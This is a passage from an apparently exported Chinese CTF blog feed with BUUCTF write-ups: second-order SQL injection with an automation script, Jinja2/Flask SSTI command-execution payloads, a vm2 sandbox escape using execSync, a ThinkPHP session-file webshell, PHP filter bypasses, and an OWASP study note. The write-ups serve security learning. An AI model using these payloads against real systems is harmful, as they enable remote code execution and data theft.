:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;        </code></pre><p>åœ¨<code>update.php</code>é¡µé¢POSTæäº¤ï¼Œé‡æ–°ç™»å½•ï¼ˆadminï¼Œå¯†ç éšæ„ï¼‰å¾—åˆ°flag</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>unserialize</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>unserialize</tag>
      
      <tag>char.escape</tag>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Unfinish</title>
    <link href="/2021/04/29/BUU79/"/>
    <url>/2021/04/29/BUU79/</url>
    
    <content type="html"><![CDATA[<h2 id="SQL-äºŒæ¬¡æ³¨å…¥"><a href="#SQL-äºŒæ¬¡æ³¨å…¥" class="headerlink" title="SQL äºŒæ¬¡æ³¨å…¥"></a>SQL äºŒæ¬¡æ³¨å…¥</h2><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/181130/17/1544/29996/608ad77eE7e059785/fcb10cb3973eb937.png" alt="01.png">      </p><p>URLä¸ºï¼š<code>http://0394ab22-e370-4cca-91f6-05a8ac92ab21.node3.buuoj.cn/login.php</code>     </p><p>æœ‰<code>login.php</code>,çœ‹ä¸‹æœ‰æ²¡æœ‰<code>register.php</code>      </p><p>æœç„¶      </p><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/189730/22/621/29267/608ad7f4Eb2fe540a/175965ef798babd3.png" alt="02.png"><br>éšä¾¿æ³¨å†Œä¸ªçœ‹çœ‹<br><img src="https://img11.360buyimg.com/ddimg/jfs/t1/194217/13/548/131720/608ad830E2605bd5a/3e109deab88c8cf1.png" alt="03.png"><br>å¯ä»¥çœ‹åˆ°åœ¨ä¾§è¾¹æ è¿™é‡Œæ˜¾ç¤ºäº†æˆ‘ä»¬çš„ç”¨æˆ·å          </p><p>äºŒæ¬¡æ³¨å…¥       </p><p>è¿‡æ»¤äº†<code>,</code>å’Œ<code>information</code><br>æ‰€ä»¥æ²¡æ³•æŠ¥é”™æ³¨äº†     </p><p>æ–°å§¿åŠ¿<code>0&#39;+hex(hex(database()))+&#39;0</code>       </p><p>ä¹‹æ‰€ä»¥è¦ä¸¤æ¬¡hexç¼–ç æ˜¯å› ä¸ºï¼Œä¸€æ¬¡ç¼–ç äº§ç”Ÿçš„ç»“æœé‡Œå¯èƒ½æœ‰å­—æ¯ï¼ŒåŠ 0åå°±æˆäº†å­—æ¯å‰é¢çš„çº¯æ•°å­—      </p><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/186262/16/1480/306644/608ad9e5Eb3f7074c/bf9784e6e02681be.png" alt="04.png">        </p><p>æ•°å­—è¿‡å¤§è½¬ä¸ºäº†ç§‘å­¦è®¡æ•°æ³•       </p><p>ç”¨substr,<code>,</code>è¢«è¿‡ï¼Œå˜ä¸º<code>from x for x</code>       </p><p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/185436/35/1509/304850/608ada67E0214a5f5/8198055dc97e7fa4.png" alt="05.png">        </p><p>ä¹Ÿå¯ä»¥<code>ascii(substr(database() from 1 for 1))</code></p><p>å¾—åˆ°database()æ˜¯web       </p><p>ä½†informationè¢«è¿‡ï¼Œæ‰€ä»¥æ²¡æ³•è¯»è¡¨å•¥çš„        </p><p>çœ‹åˆ«äººWPéƒ½æ˜¯çŒœçš„<code>select * from flag</code>      </p><p>(å•Šè¿™)    </p><p>æœ€åå†™ä¸ªè„šæœ¬è·‘ä¸€ä¸‹     </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> re<span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleepflag = <span class="hljs-string">&#x27;&#x27;</span>url = <span class="hljs-string">&#x27;http://0394ab22-e370-4cca-91f6-05a8ac92ab21.node3.buuoj.cn/&#x27;</span>url1 = url+<span class="hljs-string">&#x27;register.php&#x27;</span>url2 = url+<span class="hljs-string">&#x27;login.php&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):    sleep(<span class="hljs-number">0.3</span>)    data1 = &#123;<span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;1234&#123;&#125;@123.com&quot;</span>.<span class="hljs-built_in">format</span>(        i), <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;0&#x27;+ascii(substr((select * from flag) from &#123;&#125; for 1))+&#x27;0;&quot;</span>.<span class="hljs-built_in">format</span>(i), <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;123&quot;</span>&#125;    data2 = &#123;<span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;1234&#123;&#125;@123.com&quot;</span>.<span class="hljs-built_in">format</span>(i), <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;123&quot;</span>&#125;    r1 = requests.post(url1, data=data1)    r2 = requests.post(url2, data=data2)    res = re.search(<span class="hljs-string">r&#x27;&lt;span class=&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;/span&gt;&#x27;</span>, r2.text)    res1 = re.search(<span class="hljs-string">r&#x27;\d+&#x27;</span>, res.group())    flag = flag+<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(res1.group()))    print(flag)</code></pre></code></pre><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/175950/30/7065/148511/608adb94E422ae4f9/34785ddab5c3f6fc.png" alt="06.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>SQL</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
      <tag>CTF</tag>
      
      <tag>SQL</tag>
      
      <tag>äºŒæ¬¡æ³¨å…¥</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Double Secret</title>
    <link href="/2021/04/27/BUU78/"/>
    <url>/2021/04/27/BUU78/</url>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="_-__-"></a><code>_-__-</code></h2><p>æ‰“å¼€æ˜¯è¿™æ ·<br><img src="https://img10.360buyimg.com/ddimg/jfs/t1/172299/33/6670/3057/6087c133E05eb4964/f7d5c0725165dfea.png" alt="01.png">       </p><p>å„ç§æ‰¾ï¼Œå‘ç°<code>robots.txt</code><br>æœ‰ä¸€å¥è¯â€”â€“<code>It is Android ctf</code><br>????    </p><p>ç„¶åå°±æ‰«ç›®å½•ï¼Œ<code>/secrect</code>      </p><p>å¾—åˆ°ï¼š<code>Tell me your secret.I will encrypt it so others can&#39;t see</code>       </p><p>ä¼ å…¥å‚æ•°ï¼š<code>?secrect=123</code><br>â€”-&gt;<code>d]</code>      </p><p>ç„¶åè¯•è¯•å…¶ä»–çš„ï¼Œæ„Ÿè§‰ä¹Ÿæ²¡ä»€ä¹ˆè§„å¾‹        </p><p>å½“æˆ‘è¾“äº†ä¸€ä¸ªå¤§çš„æ•°åï¼Œ  æŠ¥é”™äº†<br><code>?secrect=123123</code><br><img src="https://img12.360buyimg.com/ddimg/jfs/t1/164560/32/20921/70003/6087c295Ee2b4b2b0/3375b41da3b33055.png" alt="02.png"><br>ç„¶åå°±ä¸çŸ¥é“æ€ä¹ˆç»§ç»­äº†     </p><p>WP       </p><p>ä¸»è¦ç‚¹ï¼š<br><img src="https://img13.360buyimg.com/ddimg/jfs/t1/189991/37/260/20393/6087c2e6E7772c1a4/0a96aad8ab0d1ac7.png" alt="03.png">      </p><p>å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡ŒRC4è§£å¯†ï¼Œç„¶åç»è¿‡<code>render_template_string</code><br>è¿™é‡Œå­˜åœ¨SSTI      </p><p>RC4åŠ å¯†è„šæœ¬         </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rc4_main</span>(<span class="hljs-params">key=<span class="hljs-string">&quot;init_key&quot;</span>, message=<span class="hljs-string">&quot;init_message&quot;</span></span>):</span>  <span class="hljs-comment"># è¿”å›åŠ å¯†åå¾—å†…å®¹</span>    s_box = rc4_init_sbox(key)    crypt = <span class="hljs-built_in">str</span>(rc4_excrypt(message, s_box))    <span class="hljs-keyword">return</span> crypt<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rc4_init_sbox</span>(<span class="hljs-params">key</span>):</span>    s_box = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))    j = <span class="hljs-number">0</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):        j = (j + s_box[i] + <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)])) % <span class="hljs-number">256</span>        s_box[i], s_box[j] = s_box[j], s_box[i]    <span class="hljs-keyword">return</span> s_box<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rc4_excrypt</span>(<span class="hljs-params">plain, box</span>):</span>    res = []    i = j = <span class="hljs-number">0</span>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> plain:        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>        j = (j + box[i]) % <span class="hljs-number">256</span>        box[i], box[j] = box[j], box[i]        t = (box[i] + box[j]) % <span class="hljs-number">256</span>        k = box[t]        res.append(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(s) ^ k))    cipher = <span class="hljs-string">&quot;&quot;</span>.join(res)    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(base64.b64encode(cipher.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)), <span class="hljs-string">&#x27;utf-8&#x27;</span>)key = <span class="hljs-string">&quot;HereIsTreasure&quot;</span>  <span class="hljs-comment"># æ­¤å¤„ä¸ºå¯†æ–‡</span>message = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥æ˜æ–‡:\n&quot;</span>)enc_base64 = rc4_main(key, message)enc_init = <span class="hljs-built_in">str</span>(base64.b64decode(enc_base64), <span class="hljs-string">&#x27;utf-8&#x27;</span>)enc_url = parse.quote(enc_init)print(<span class="hljs-string">&quot;rc4åŠ å¯†åçš„urlç¼–ç :&quot;</span> + enc_url)<span class="hljs-comment"># print(&quot;rc4åŠ å¯†åçš„base64ç¼–ç &quot;+enc_base64)</span></code></pre></code></pre><p>æ˜æ–‡è¾“å…¥SSTIçš„payloadï¼š<br><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code>     </p><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/166916/2/20756/717273/6087c89fEf400f1c8/5d5e711f5e5060ff.png" alt="05.png">      </p><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/186127/13/1163/8759/6087c863E6220db00/67e1250969f3a7eb.png" alt="04.png">        </p><p>è™½ç„¶æœ‰ä¸ªæŠ¥é”™ï¼ˆé‚£ä¸ªsafeå‡½æ•°ï¼‰ï¼Œä½†è¿˜æ˜¯å¾—åˆ°äº†ç»“æœã€‚</p><p><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag.txt').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code><br>å¾—åˆ°flag       </p><p><a href="https://blog.csdn.net/qq_41381461/article/details/100991617?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-3.control&dist_request_id=&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-3.control">Rc4åŠ å¯†</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>I_&lt;3_Flask</title>
    <link href="/2021/04/26/BUU77/"/>
    <url>/2021/04/26/BUU77/</url>
    
    <content type="html"><![CDATA[<h2 id="1-1"><a href="#1-1" class="headerlink" title="1_1"></a>1_1</h2><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/161519/39/21188/9767/6086ba66E2717eebd/6a88b62e64abede0.png" alt="01.png">       </p><p>é¢˜ç›®æ˜¯flaskï¼Œåº”è¯¥æ˜¯SSTIäº†å§<br>ä½†æ²¡å‚æ•°        </p><p><a href="https://github.com/rakjong/Arjun"><code>arjun</code></a><br>è¿™ä¸ªå¯ä»¥æ¥çˆ†ç ´å‚æ•°<br>å…ˆä¸‹è½½ï¼Œç„¶ååˆ°arjunç›®å½•ä¸‹<br><img src="https://img13.360buyimg.com/ddimg/jfs/t1/180871/9/1120/185944/6086bbb1E090ab472/52e2d85cb4d99503.png" alt="02.png">       </p><p>å®‰è£…<br><img src="https://img12.360buyimg.com/ddimg/jfs/t1/196052/31/68/531183/6086bbb4E1c038775/a9233572bd309699.png" alt="03.png">        </p><p>ä½¿ç”¨<br><img src="https://img11.360buyimg.com/ddimg/jfs/t1/166728/7/20579/248205/6086bbb1E09bb265d/265b5c678e16dd73.png" alt="04.png">        </p><p>çˆ†ç ´å‡ºå‚æ•°æ˜¯name        </p><p>é™¤æ­¤ä¹‹å¤–å°±æ²¡å•¥äº†<br>payloadï¼š<code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[182].__init__.__globals__.__builtins__['eval']("__import__('os').popen('ls').read()")&#125;&#125;</code>       </p><p><code>&#123;&#123;config.__class__.__init__.__globals__['os'].popen('ls').read()&#125;&#125;</code><br>ä¸¤ä¸ªéƒ½è¡Œ<img src="https://img12.360buyimg.com/ddimg/jfs/t1/189306/16/158/12638/6086bc79E75a9f880/16bb47b996587c46.png" alt="05.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nep2</title>
    <link href="/2021/04/25/nep2/"/>
    <url>/2021/04/25/nep2/</url>
    
    <content type="html"><![CDATA[<p>è§†é¢‘äºŒï¼š<a href="https://www.hacker101.com/sessions/pentest_owasp">https://www.hacker101.com/sessions/pentest_owasp</a></p><p>1.ç›®å‰owaspçš„åå¤§webå®‰å…¨æ¼æ´æ˜¯å“ªäº›ï¼Ÿè¿™äº›æ¼æ´æ’åæ˜¯æŒ‰ç…§æ¼æ´çš„ä¸¥é‡ç¨‹åº¦æ’åºçš„è¿˜æ˜¯æŒ‰ç…§æ¼æ´çš„å¸¸è§ç¨‹åº¦æ’åºçš„ï¼Ÿï¼ˆ2åˆ†ï¼‰</p><pre><code>1. Injection----&gt;æ³¨å…¥ï¼ŒSqlï¼Œnosql,OS injection,LDAP injection       2. Broken Authentication---&gt;å¤±æ•ˆçš„èº«ä»½è®¤è¯å’Œä¼šè¯ç®¡ç†3. Sensitive Data Exposure----&gt;æ•æ„Ÿæ•°æ®æ³„éœ²4. XXE5. Broken Access Control----&gt;è¶Šæƒ6. Security Misconfiguration.---&gt;å®‰å…¨é…ç½®   7. XSS8. Insecure Deserialization----&gt;ä¸å®‰å…¨çš„ååºåˆ—åŒ–9. Using Components with Known Vulnerabilities----&gt;ä½¿ç”¨ä¸å®‰å…¨çš„ç»„ä»¶ 10. Insufficient Logging &amp; Monitoring.----&gt;æ—¥å¿—å’Œç›‘æ§ä¸è¶³ä¸¥é‡ç¨‹åº¦</code></pre><p>2.è¯·ç¿»è¯‘ä¸€ä¸‹credential stuffingï¼ˆ1åˆ†ï¼‰</p><pre><code>å¯†ç å—…æ¢    </code></pre><p><a href="https://blog.csdn.net/weixin_44549063/article/details/113518965">credential stuffing attackâ€”-&gt;æ’åº“</a></p><p>3.ä¸ºä»€ä¹ˆè¯´ä¸å……åˆ†çš„æ—¥å¿—è®°å½•(insufficient logging)ä¹Ÿç®—owaspåå¤§æ¼æ´çš„ä¸€ç§ï¼Ÿä»–çš„å±å®³æ€§å¦‚ä½•ï¼ˆ2åˆ†ï¼‰</p><pre><code>æ—¥å¿—è®°å½•ä¸è¶³ï¼Œä¼šä½¿æ”»å‡»è€…è¿›ä¸€æ­¥æ”»å‡»ç³»ç»Ÿï¼Œä¿æŒæŒä¹…æ€§       owasp tenth</code></pre><p>4.è¯·ç¿»é˜…ä¸€ä¸‹owasp testing guideï¼Œä»¥åŠowasp testing guide check-listï¼Œè§†é¢‘è¯´æ€ä¹ˆç»“åˆè¿™ä¸¤ä¸ªæ–‡æ¡£æ¥å­¦ä¹ æ¸—é€æµ‹è¯•ï¼Ÿ ç»“åˆä½ å¹³æ—¶æ¸—é€è¿‡ç¨‹ä¸­çš„ç»éªŒï¼Œè°ˆè°ˆä½ çš„æ„Ÿæƒ³ã€‚ï¼ˆ3åˆ†ï¼‰   </p><pre><code>åˆ©ç”¨owasp testing guide check-listæŸ¥æ‰¾åˆ°ç›¸å…³éƒ¨åˆ†è¿›è¡Œå­¦ä¹       å°ç™½ï¼Œè¿˜æ²¡æ¸—é€è¿‡ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚         </code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JustEscape</title>
    <link href="/2021/04/25/BUU76/"/>
    <url>/2021/04/25/BUU76/</url>
    
    <content type="html"><![CDATA[<h2 id="js-vm2"><a href="#js-vm2" class="headerlink" title="js vm2"></a>js vm2</h2><p><img src="https://sc01.alicdn.com/kf/H375cdea26ac54e8c8ee6dfdf19c4a90ag.png" alt="01.png">      </p><p>ä¸‹é¢ä¸¤ä¸ªdemo     </p><p>çœ‹ä¸‹<code>run.php</code>     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">&quot;code&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="hljs-string">&#x27;code&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;    $code = $_GET[<span class="hljs-string">&#x27;code&#x27;</span>];    <span class="hljs-keyword">echo</span> <span class="hljs-keyword">eval</span>(code);&#125; <span class="hljs-keyword">else</span> &#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>è¯•äº†ä¸‹ï¼Œæ„Ÿè§‰ä»€ä¹ˆéƒ½æ‰§è¡Œä¸äº†     </p><p>å‰é¢æç¤ºè¯´<code>çœŸçš„æ˜¯ PHP å˜›</code><br>éš¾é“ä¸æ˜¯PHP      </p><p>çœ‹ä¸‹WP   </p><p>æ˜¯js      </p><p>jsè¿˜ä¸ä¼šï¼Œå…ˆç®€å•è®°ä¸€ä¸‹å§ï¼Œç­‰å­¦å­¦å†å›æ¥çœ‹çœ‹     </p><p><a href="https://www.anquanke.com/post/id/207291"><code>js  vm2æ²™ç®±é€ƒé€¸</code></a>      </p><p>payload:   </p><pre><code>code = &#39;(&#39; + function()&#123;    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();    try&#123;        Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;    &#125;catch(e)&#123;        return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();    &#125;&#125;+&#39;)()&#39;;try&#123;    console.log(new VM().run(code));&#125;catch(x)&#123;    console.log(x);&#125;</code></pre><p>ç»•è¿‡ï¼š<code>[&#39;process&#39;, &#39;exec&#39;, &#39;constructor&#39;, &#39;prototype&#39;, &#39;Function&#39;, &#39;&quot;&#39;, &#39;&#39;&#39;]</code>      </p><pre><code>?code=(function ()&#123;    TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_proces`&#125;s`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return proces`&#125;s`&#125;`)();    try&#123;        Object.preventExtensions(Buffer.from(``)).a = 1;    &#125;catch(e)&#123;        return e[`$&#123;`$&#123;`get_proces`&#125;s`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`cat /flag`).toString();    &#125;&#125;)()</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>EasyThinking</title>
    <link href="/2021/04/24/BUU75/"/>
    <url>/2021/04/24/BUU75/</url>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="-_-"></a>-_-</h2><p>çœ‹åˆ°thinkingåº”è¯¥æƒ³åˆ°åº”è¯¥æ˜¯thinkphpå§<br>è¾“å…¥ä¸ªä¸å­˜åœ¨çš„è·¯å¾„<br>æŠ¥é”™ï¼š       </p><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/179705/11/761/21532/6083de2cEcdedf453/71fb3eb71da3182c.png" alt="01.png">     </p><p><a href="https://paper.seebug.org/1114/">Think PHP V6.0.0ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´</a>       </p><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/168527/22/21222/15225/6083e0edEd9a623ed/f948321a4e4bf6fb.png" alt="02.png">    </p><p>32ä½çš„PHPSESSIDæ”¹æˆä¸€ä¸ª32ä½çš„PHPæ–‡ä»¶å  </p><p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/182857/21/741/14442/6083e0edEe42ae3cc/2c0d5a4babe2b331.png" alt="03.png">      </p><p>æœç´¢é‡Œé¢å¡«å…¥ä¸€å¥è¯      </p><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/184862/17/733/11665/6083e167E7e9a71d3/d847018ea02a13d6.png" alt="04.png"><br>å°±ä¼šè¢«å­˜æ”¾åˆ°ä¹‹å‰å†™çš„æ–‡ä»¶é‡Œé¢<br>è®¿é—®<code>http://93a0778c-632e-4f47-9ba1-8d8017ef0078.node3.buuoj.cn/runtime/session/sess_1234567890123456789012345678.php</code><br>æœ€åçš„æ–‡ä»¶åæ˜¯<code>sess_</code>+åˆšæ‰çš„32ä½    </p><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/173808/39/6300/107394/6083e23eEc8cf917d/e8254e21441627f8.png" alt="05.png">      </p><p>è¿˜è¦ç»•è¿‡<code>disable_function</code><br>å’Œä¹‹å‰é‚£é“é¢˜ä¸€æ ·        </p><p>æˆ‘çš„èšå‰‘å‡ºé—®é¢˜äº†      </p><p><a href="https://blog.csdn.net/mochu7777777/article/details/105160796/">ä¹‹å</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>EzPHP</title>
    <link href="/2021/04/23/BUU74/"/>
    <url>/2021/04/23/BUU74/</url>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="-*-"></a>-*-</h2><p>ä»£ç å®¡è®¡    </p><pre><code>```php &lt;?phphighlight_file(__FILE__);error_reporting(0); $file = &quot;1nD3x.php&quot;;$shana = $_GET[&#39;shana&#39;];$passwd = $_GET[&#39;passwd&#39;];$arg = &#39;&#39;;$code = &#39;&#39;;echo &quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;;if($_SERVER) &#123;     if (        preg_match(&#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#39;|log/i&#39;, $_SERVER[&#39;QUERY_STRING&#39;])        )          die(&#39;You seem to want to do something bad?&#39;); &#125;if (!preg_match(&#39;/http|https/i&#39;, $_GET[&#39;file&#39;])) &#123;    if (preg_match(&#39;/^aqua_is_cute$/&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !== &#39;aqua_is_cute&#39;) &#123;         $file = $_GET[&quot;file&quot;];         echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;    &#125; &#125; else die(&#39;fxck you! What do you want to do ?!&#39;);if($_REQUEST) &#123;     foreach($_REQUEST as $value) &#123;         if(preg_match(&#39;/[a-zA-Z]/i&#39;, $value))              die(&#39;fxck you! I hate English!&#39;);     &#125; &#125; if (file_get_contents($file) !== &#39;debu_debu_aqua&#39;)    die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&quot;);if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;    extract($_GET[&quot;flag&quot;]);    echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;&#125; else&#123;    die(&quot;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&quot;);&#125;if(preg_match(&#39;/^[a-z0-9]*$/isD&#39;, $code) || preg_match(&#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#39;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#39;, $arg) ) &#123;     die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag =w=&quot;); &#125; else &#123;     include &quot;flag.php&quot;;    $code(&#39;&#39;, $arg); &#125; ?&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?```     </code></pre><p>é¦–å…ˆç¬¬ä¸€å±‚ï¼š      </p><pre><code>if($_SERVER) &#123;     if (        preg_match(&#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#39;|log/i&#39;, $_SERVER[&#39;QUERY_STRING&#39;])        )          die(&#39;You seem to want to do something bad?&#39;); &#125;</code></pre><p>urlç¼–ç å¯ä»¥ç»•è¿‡ï¼Œ<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>æ¥å—ï¼Ÿåçš„ï¼Œä¸ä¼šå¯¹å…¶urlè§£ç      </p><p>ç¬¬äºŒå±‚ï¼š       </p><pre><code>if (!preg_match(&#39;/http|https/i&#39;, $_GET[&#39;file&#39;])) &#123;    if (preg_match(&#39;/^aqua_is_cute$/&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !== &#39;aqua_is_cute&#39;) &#123;         $file = $_GET[&quot;file&quot;];         echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;    &#125; &#125; else die(&#39;fxck you! What do you want to do ?!&#39;);     </code></pre><p>ç¬¬äºŒä¸ªåŒ¹é…å¯ä»¥æœ€ååŠ %0aç»•è¿‡      </p><p>ç¬¬ä¸‰å±‚ï¼š</p><pre><code>if($_REQUEST) &#123;     foreach($_REQUEST as $value) &#123;         if(preg_match(&#39;/[a-zA-Z]/i&#39;, $value))              die(&#39;fxck you! I hate English!&#39;);     &#125; &#125;</code></pre><p>ç»•è¿‡<code>$_REQUEST</code><br><code>$_REQUEST åŒæ—¶æ¥å— GET å’Œ POST çš„æ•°æ®ï¼Œå¹¶ä¸” POST å…·æœ‰æ›´é«˜çš„ä¼˜å…ˆå€¼</code><br>æ‰€ä»¥å¯ä»¥POSTæ•°å­—æ¥ç»•è¿‡<br><code>POSTï¼šdebu=1&amp;&amp;file=1 </code>   </p><pre><code>if (file_get_contents($file) !== &#39;debu_debu_aqua&#39;)    die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&quot;);         </code></pre><p>dataåè®®<code>data://text/plain,debu_debu_aqua</code><br><code>debu_debu_aqua</code>è®°å¾—URLç¼–ç         </p><p>ç¬¬å››å±‚ï¼š     </p><pre><code>if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;    extract($_GET[&quot;flag&quot;]);    echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;&#125; else&#123;    die(&quot;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&quot;);&#125;       </code></pre><p>æ•°ç»„ç»•è¿‡     </p><p><code>shana[]=1&amp;passwd[]=2</code><br>URLç¼–ç      </p><p>ç¬¬äº”å±‚ï¼š    </p><pre><code>if(preg_match(&#39;/^[a-z0-9]*$/isD&#39;, $code) || 